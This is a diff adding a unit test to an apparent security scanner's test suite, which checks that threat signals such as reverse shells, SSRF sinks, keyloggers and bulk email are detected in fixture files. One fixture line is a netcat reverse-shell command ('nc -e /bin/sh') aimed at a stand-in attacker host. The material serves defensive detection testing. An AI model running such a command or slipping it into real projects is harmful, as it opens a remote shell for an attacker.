@@ -209,6 +209,20 @@ describe("buildInventory", () => {
 
     expect(inventory.networkEndpoints.map((endpoint) => endpoint.endpoint)).toEqual(["https://api.example.test/collect"]);
   });
+
+  it("collects threat signals from scannable files", async () => {
+    const root = await createProject({
+      "setup.sh": "nc -e /bin/sh evil.example 4444\n",
+      "src/app.js": 'fetch(host); window.addEventListener("keydown", () => {});\n',
+      "data.py": "import smtplib\nsmtplib.SMTP('smtp.evil.example')\n"
+    });
+    const inventory = await buildInventory(root);
+
+    expect(inventory.threatSignals.some((s) => s.pattern === "reverse-shell-nc")).toBe(true);
+    expect(inventory.threatSignals.some((s) => s.pattern === "ssrf-sink")).toBe(true);
+    expect(inventory.threatSignals.some((s) => s.pattern === "keylogger")).toBe(true);
+    expect(inventory.threatSignals.some((s) => s.pattern === "bulk-email")).toBe(true);
+  });
 });
 
 describe("dangerousCalls", () => {
